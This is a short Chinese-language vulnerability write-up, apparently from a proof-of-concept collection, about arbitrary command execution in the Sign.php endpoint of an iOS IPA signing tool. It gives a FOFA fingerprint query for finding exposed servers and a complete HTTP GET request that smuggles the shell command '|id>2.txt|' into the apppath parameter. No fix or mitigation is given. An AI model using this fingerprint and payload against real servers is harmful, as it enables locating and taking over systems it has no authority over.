# 苹果IOS端IPA签名工具Sign.php前台任意命令执行漏洞

苹果IOS端IPA签名工具Sign.php前台任意命令执行漏洞，可能导致攻击者任意上传文件，控制服务器权限。

## fofa

```javascript
body="/assets/index/css/mobileSelect.css"
```

## poc

```javascript
GET /api/sign/sign?udidres[0][sjskg]=1&noinject[name]=a&ttname=1&udid=1&appname=1&appid=a&appicon=1&apppath=|id>2.txt|&p12path=1&mppath=1&appbid=1&ipaPath=1&gm=0&filesPath=1&rm=1&app_name=1 HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20241107115421829](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411071154927.png)